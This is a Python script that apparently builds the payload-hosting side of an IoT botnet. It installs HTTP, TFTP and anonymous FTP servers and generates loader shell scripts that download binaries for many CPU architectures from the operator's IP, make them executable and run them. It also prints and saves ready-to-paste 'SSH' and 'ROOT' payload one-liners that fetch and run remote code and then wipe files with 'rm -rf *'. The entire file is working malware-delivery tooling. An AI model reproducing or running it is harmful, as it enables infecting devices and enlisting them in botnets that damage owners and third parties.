import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "SSH"
exec_name = "SSH"
bin_prefix = ""
bin_directory = "SBIDIOT"
archs = ["x86",               
"mips",                       
"mpsl",                       
"arm",                       
"arm6",                       
"arm7",                       
"ppc",                        
"m68k", 
"root",
"rtk",
"sh4",
"zte",                     
"sh4"]                       
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\x1b[0;31mSetting Up your ROOT And SSH Payload....")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\x1b[0;37mExporting to payload.txt...")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/bins.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/bins.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/bins.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/.sh')
run('echo "#!/bin/bash" > /var/www/html/sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/.sh')
run('echo "#!/bin/bash" > /var/ftp/.sh')
run('echo "ulimit -n 1024" >> /var/ftp/.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/www/html/sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/ftp/.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/bins.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+' '+exec_name+'" >> /var/lib/tftpboot/.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[0;37m---------------------------------------------------------------------------")
print("\x1b[1;37mSSH Payload: \x1b[0;31mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/sh; curl -O http://" + ip + "/sh; chmod 777 sh; sh sh; tftp " + ip + " -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g " + ip + "; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *\x1b[0m")
print("\x1b[0;31m---------------------------------------------------------------------------")
print("\x1b[1;37mROOT PayLoader: \x1b[0;31mcd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/SBIDIOT/x86 -O /tmp/; chmod +x /tmp/; /tmp/x86")
print("\x1b[0;37m---------------------------------------------------------------------------")
complete_payload1 = ("(SSH Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/sh; curl -O http://" + ip + "/sh; chmod 777 sh; sh sh; tftp " + ip + " -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g " + ip + "; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *)")
complete_tab = ("																			")
complete_line = ("---------------------------------------------------------------------------------------------------------------------------------------------------------------------")

complete_payload2 = ("(ROOT PayLoader: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/SBIDIOT/x86 -O /tmp/; chmod +x /tmp/; /tmp/x86)")
f = open("payload.txt","w+")
f.write(complete_payload1)
f.write(complete_tab)
f.write(complete_line)

f.write(complete_payload2)
f.close()
raw_input("\x1b[0;31mPayloaders are in payload.txt....")
